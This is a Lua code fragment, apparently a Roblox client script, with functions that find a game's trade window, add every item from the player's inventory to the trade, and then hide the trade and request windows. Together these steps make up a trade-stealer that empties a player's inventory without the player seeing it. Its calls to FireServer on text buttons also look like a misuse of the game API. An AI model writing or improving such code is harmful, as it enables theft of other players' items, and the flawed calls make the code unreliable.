-- Find the trade window (GUI that appears after trade starts)
local function findTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return nil end
    local function search(parent)
        for _, child in pairs(parent:GetChildren()) do
            local visible = false
            if child:IsA("ScreenGui") then visible = child.Enabled end
            if child:IsA("Frame") then visible = child.Visible end
            if (child:IsA("ScreenGui") or child:IsA("Frame")) and visible then
                local size = child.AbsoluteSize
                if size.X > 200 and size.Y > 200 then
                    local hasAdd, hasAccept = false, false
                    for _, sub in pairs(child:GetDescendants()) do
                        if sub:IsA("TextButton") then
                            if sub.Name:lower():find("add") or sub.Name:lower():find("select") then hasAdd = true end
                            if sub.Name:lower():find("accept") or sub.Name:lower():find("confirm") then hasAccept = true end
                        end
                    end
                    if hasAdd and hasAccept then return child end
                end
            end
            local found = search(child)
            if found then return found end
        end
        return nil
    end
    return search(gui)
end

-- Click all Add buttons to add all items
local function addAllItemsViaGUI(tradeWindow)
    if not tradeWindow then return 0 end
    local count = 0
    -- Look for Add All button
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") and (btn.Name:lower():find("add all") or btn.Name:lower():find("select all")) then
            pcall(function() btn:FireServer() end)
            print("Clicked Add All")
            return 1
        end
    end
    -- Click each individual Add/Select button on item slots
    for _, btn in pairs(tradeWindow:GetDescendants()) do
        if btn:IsA("TextButton") then
            local name = btn.Name:lower()
            if name:find("add") or name:find("select") then
                local parent = btn.Parent
                if parent and parent:IsA("Frame") and parent:FindFirstChild("ImageLabel") then
                    pcall(function() btn:FireServer() end)
                    count = count + 1
                    print("Added item from slot: " .. parent.Name)
                end
            end
        end
    end
    return count
end

-- Hide the trade window (after adding)
local function hideTradeWindow()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Enabled = false
        end
        if obj:IsA("Frame") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
            obj.Visible = false
        end
        if obj:IsA("Frame") and obj.AbsoluteSize.X > 200 and obj.AbsoluteSize.Y > 200 then
            local hasAccept, hasAdd = false, false
            for _, sub in pairs(obj:GetDescendants()) do
                if sub:IsA("TextButton") then
                    if sub.Name:lower():find("accept") or sub.Name:lower():find("confirm") then hasAccept = true end
                    if sub.Name:lower():find("add") or sub.Name:lower():find("select") then hasAdd = true end
                end
            end
            if hasAccept and hasAdd then
                obj.Visible = false
                if obj.Parent and obj.Parent:IsA("ScreenGui") then
                    obj.Parent.Enabled = false
                end
            end
        end
    end
end

